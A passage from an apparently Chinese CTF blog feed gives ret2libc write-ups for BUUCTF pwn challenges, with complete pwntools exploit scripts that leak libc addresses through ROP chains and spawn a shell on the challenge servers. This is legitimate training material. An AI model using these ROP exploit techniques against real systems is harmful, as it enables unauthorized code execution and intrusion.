class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>vunl():</strong></p><p><img src="/images/pwn6-1.png"></p><p>buf存在栈溢出，根据题目也能看出来要泄露libc地址构造ROP。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>用<strong>puts</strong>函数找基址：</li></ul><p>可以与上面32位泄露做一个对比。这里用puts函数泄露（必须是已经调用过的函数）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts_plt=elf<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;puts&quot;</span>]</span><br>puts_got=elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;puts&quot;</span>]</span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br>pop_rdi_ret=<span class="hljs-number">0</span>x400733<br>main=elf<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;main&#x27;</span>]</span><br>start=<span class="hljs-number">0</span>x400530<br>ret=<span class="hljs-number">0</span>x400734<br>payload1=b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0</span>x28)+<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(puts_got)+<span class="hljs-built_in">p64</span>(puts_plt)+<span class="hljs-built_in">p64</span>(main)<br>#这里最后的<span class="hljs-built_in">p64</span>(main)也可以换成start的地址<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendline</span>(payload1)<br>puts=<span class="hljs-built_in">u64</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libcbase=puts-libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;puts&quot;</span>)<br>system=libcbase+libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;system&quot;</span>)<br>str_bin_sh=libcbase+libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br></code></pre></td></tr></table></figure><p>利用溢出，pop rdi放入返回地址，返回时执行，把puts的got表地址返回到rdi里，接下来ret到puts plt，puts-plt则是执行puts函数，rdi里是puts got的地址，而这个地址又指向puts的真实地址。也就是说，puts put了自己的真实地址<br>payload1写好后发送，变量puts接收了真实地址。这里用了个ljust。puts地址前6个字节有效，所以最后得人为添加’\x00’补全8字节（这里其实我也没太明白6个字节有效）。</p><p>puts真实地址减去偏移地址得到基址，基址加system的偏移地址得到system的真实地址。</p><ul><li>执行system<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload2=b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0</span>x28)+<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(str_bin_sh)+<span class="hljs-built_in">p64</span>(system)+<span class="hljs-built_in">p64</span>(ret)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendline</span>(payload2)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.interactive</span>()<br></code></pre></td></tr></table></figure>这里我在system地址后面跟了一个ret地址作为system执行的地址，按我之前看过的资料来说确实需要加上，但这里不加也能打通，这里有点不懂了。</li></ul><h3 id="完整exp：-1"><a href="#完整exp：-1" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">p</span>=remote(&quot;node4.buuoj.cn&quot;,27918)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./bjdctf_2020_babyrop&quot;)<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>p.recvuntil(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br><span class="hljs-attribute">pop_rdi_ret</span>=0x400733<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">start</span>=0x400530<br><span class="hljs-attribute">ret</span>=0x400734<br><span class="hljs-attribute">payload1</span>=b&quot;A&quot;*(0x28)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload1)<br><span class="hljs-attribute">puts</span>=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;puts&quot;,puts)<br><span class="hljs-attribute">libcbase</span>=puts-libc.dump(&quot;puts&quot;)<br><span class="hljs-attribute">system</span>=libcbase+libc.dump(&quot;system&quot;)<br><span class="hljs-attribute">str_bin_sh</span>=libcbase+libc.dump(&quot;str_bin_sh&quot;)<br><span class="hljs-attribute">payload2</span>=b&quot;A&quot;*(0x28)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system)+p64(ret)<br>p.recvuntil(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/images/pwn6-2.png"></p><p>跑这个脚本之前试过很多次都出现了“timeout: the monitored command dumped core”这个报错。原因是在选择libc版本时可以看到给了很多选项，我看都没看就选了第0个，怎么也打不通，后来换了第3个,问题解决</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Multi</span> Results:<br> <span class="hljs-attribute">0</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">1</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2_i386)<br> <span class="hljs-attribute">2</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">3</span>: ubuntu-xenial-amd64-libc6 (id libc6_2.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu10_amd64)<br> <span class="hljs-attribute">4</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu1_i386)<br></code></pre></td></tr></table></figure><h2 id="例题3-https-buuoj-cn-challenges-HarekazeCTF2019-baby-rop2"><a href="#例题3-https-buuoj-cn-challenges-HarekazeCTF2019-baby-rop2" class="headerlink" title="例题3 https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2"></a>例题3 <a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p> 例行检查，64位，开启了nx保护。</p><p> 运行程序有两个输入点。</p><p> 拖到ida看看，<br> main函数：</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">28</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>);<br>  v5 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  buf[v5 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>buf存在栈溢出。没有可以利用的后门函数，思路还是利用read函数泄露libc地址，然后获取system和binsh的地址。<br>这道题具体用printf函数输出read函数的地址。<br>但是这里我想补充一点，因为之前做此类题目时并没有很好的理解plt got表它们的作用是什么，只是按部就班的泄露。</p><p><strong>plt和got表</strong></p><p>例如像 call scanf 这样一条指令，它的具体过程大概是：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">call <span class="hljs-keyword">scanf </span>—&gt; <span class="hljs-keyword">scanf的plt表 </span>—&gt;<span class="hljs-keyword">scanf的got表</span><br></code></pre></td></tr></table></figure><p> 结合这张图可以更好地理解：</p><p> <img src="/images/pwn10-1.png"></p><p>简单来说，程序能够通过plt表找到got表中函数的地址，从而执行函数的功能。</p><hr><p>理解了这一点，再回到这一道题，能更好的理解利用printf函数泄露read函数的真实地址，并且在之后构建payload时也能更加清晰。</p><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>泄露libc地址</li></ul><p>这道题利用printf函数，先贴上原型：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span>* format , [argument] ... )</span></span>;<br></code></pre></td></tr></table></figure><p>有两个参数，一个是带有类似于%s这种格式的字符串，另一个就是要输出的参数。</p><ol><li>第一个参数直接在源程序中找了，这里就有一个。</li></ol><p> <img src="/images/pwn10-2.png"></p><p>str_addr&#x3D;0x0000000000400770</p><ol start="2"><li><p>第二个参数就是需要输出的read函数地址。</p></li><li><p>使用ROPgadget查找rdi、rsi寄存器地址来传递参数。<br>这里查找的时候只有</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ ROPgadget --binary babyrop2 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;rsi&#x27;</span> <br><span class="hljs-number">0</span>x0000000000400731 : <span class="hljs-keyword">pop</span> rsi ; <span class="hljs-keyword">pop</span> r15 ; ret<br><br></code></pre></td></tr></table></figure><p>带着一个r15，我们用不到，所以一会直接把这个寄存器的参数设置成0好了。</p></li></ol><p>这一步骤的payload：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali">payload=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(str_addr)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(print_plt)+p64(main)<br><br>解释一下，‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>p64(pop_rdi)+p64(str_addr)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’<br>接收输出的read函数地址<br></code></pre></td></tr></table></figure><p>接收地址的指令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">read_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>看其他人解释为：接收地址基本上都是7个字节的，7f开头，补全8个字节<br>就当补充个常识吧。。</p><ul><li>根据基址计算system binsh的地址，执行system</li></ul><p>后面还是熟悉的流程，直接看完整exp吧。</p><h3 id="完整exp：-2"><a href="#完整exp：-2" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,26496)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./babyrop2&quot;)<br><br><span class="hljs-attribute">print_plt</span>=elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br><span class="hljs-attribute">read_got</span>=elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br><span class="hljs-attribute">main</span>=0x0000000000400636<br><span class="hljs-attribute">poprdi</span>=0x0000000000400733<br><span class="hljs-attribute">poprsi</span>=0x0000000000400731<br><span class="hljs-attribute">str_addr</span>=0x0000000000400770<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(read_got)+p64(poprsi)+p64(read_got)+p64(0)+p64(print_plt)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br><br>r.sendline(payload)<br>read_addr = u64(r.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#puts_addr=u64(r.recv(8))</span><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;read&quot;,read_addr)<br><span class="hljs-attribute">libcbase</span>=read_addr-libc.dump(&quot;read&quot;)<br><span class="hljs-attribute">system</span>=libcbase+libc.dump(&quot;system&quot;)<br><span class="hljs-attribute">binsh</span>=libcbase+libc.dump(&quot;str_bin_sh&quot;)<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(binsh)+p64(system)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br>r.sendline(payload)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>但是！！明明脚本没什么问题，又遇到了之前的错误timeout: the monitored command dumped core<br>这次更换libc版本也不行，百思不得其解。。。<br>这个问题如果后续解决了再补充。。。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> ret2libc：</p><ul><li>根据puts、write等函数泄露libc地址，注意32&#x2F;64位的区别（64位堆栈平衡问题、接收地址时是u32还是u64，接受的位数），以及write函数设置参数的问题。</li><li>计算偏移、system、binsh的地址</li><li>执行system（32&#x2F;64参数顺序问题）</li><li>ps.脚本和源程序放在LibcSearcher目录下哦</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ROP初尝试</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-2018-rop）"><a href="#例题（BUUCTF-2018-rop）" class="headerlink" title="例题（BUUCTF 2018_rop）"></a>例题（BUUCTF 2018_rop）</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/pwn4-1.png"></p><p>32位，开启了NX保护.</p><p>用ida看一下，主要函数就两个。<br><img src="/images/pwn4-2.png"></p><p><strong>main():</strong></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">int</span> <span class="hljs-function">__cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  be_nice_to_people();<br>  vulnerable_function();<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">0xD</span>u)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>vulnerable_function():</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">vulnerable_function</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[136]</span>; <span class="hljs-comment">// [esp+10h] [ebp-88h] BYREF</span><br><br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>&#125;<br></code></pre></td></tr></table></figure><p>buf很明显存在栈溢出，没有system 、&#x2F;bin&#x2F;sh,也没有其他信息了，是泄露libc类型的题目。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>利用write函数来泄露程序的libc版本</li><li>知道libc版本后去计算程序里的system函数和字符串“&#x2F;bin&#x2F;sh”的地址</li><li>覆盖返回地址为system（‘&#x2F;bin&#x2F;sh’），获取shell</li></ul><p><strong>1.泄露程序的libc版本：</strong></p><p>write函数说明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span>*buf,<span class="hljs-type">size_t</span> count)</span></span>;<br></code></pre></td></tr></table></figure><p>fd:是文件描述符（write所对应的是写，即就是1）<br>buf:通常是一个字符串，需要写入的字符串<br>count：是每次写入的字节数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span>x88+<span class="hljs-number">4</span>)+<span class="hljs-built_in">p32</span>(write_plt)+<span class="hljs-built_in">p32</span>(main)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p32</span>(write_got)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">4</span>)<br>r<span class="hljs-selector-class">.sendline</span>(payload)<br>write_addr=<span class="hljs-built_in">u32</span>(r<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">4</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br></code></pre></td></tr></table></figure><p>首先填充造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）<br>p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位</p><p><strong>2.算出程序的偏移量，计算system和bin&#x2F;sh的地址</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">offset</span>=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)     <span class="hljs-comment">#计算偏移量</span><br>                                <span class="hljs-comment">#偏移量=程序里的函数地址-libc里的函数地址</span><br><span class="hljs-attr">system_addr</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-attr">bin_sh</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>3.构造rop获取shell</strong></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload=&#x27;a&#x27;*(<span class="hljs-number">0</span>x88+4)+p32(<span class="hljs-name">system_addr</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">bin_sh</span>)<br></code></pre></td></tr></table></figure><h3 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node3.buuoj.cn&#x27;,27043)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./2018_rop&#x27;)<br><br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)<br>r.sendline(payload)<br><span class="hljs-attribute">write_addr</span>=u32(r.recv(4))<br><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">offset</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><br><span class="hljs-attribute">system_addr</span>=offset+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bin_sh</span>=offset+libc.dump(&#x27;str_bin_sh&#x27;)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>这里一开始会报错，报错内容大概是LibcSearcher不能用，但是我确实安装了这个包，后来发现是因为没有将二进制程序和脚本放到LibcSearcher目录下。</p><p>放到同一目录下之后，再运行脚本：</p><p><img src="/images/pwn4-3.png"></p><p>匹配到了多个libc版本，选第一个，之后就可以查看flag了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn练习——32位栈溢出</title>
    <link href="/2023/09/18/Pwn%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%9432%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/09/18/Pwn%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%9432%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-ciscn-2019-ne-5）"><a href="#例题（BUUCTF-ciscn-2019-ne-5）" class="headerlink" title="例题（BUUCTF ciscn_2019_ne_5）"></a>例题（BUUCTF ciscn_2019_ne_5）</h2><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p><img src="/images/pwn3-4.png"></p><p>开启了nx保护。</p><p>运行程序试一试：</p><p><img src="/images/pwn3-1.png"></p><p>要求输入密码，从ida中看到密码为“administrator”，输入后看到几个选项，</p><p><img src="/images/pwn3-2.png"></p><p>下面依次看一下几个主要函数。</p><p><strong>main函数：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; 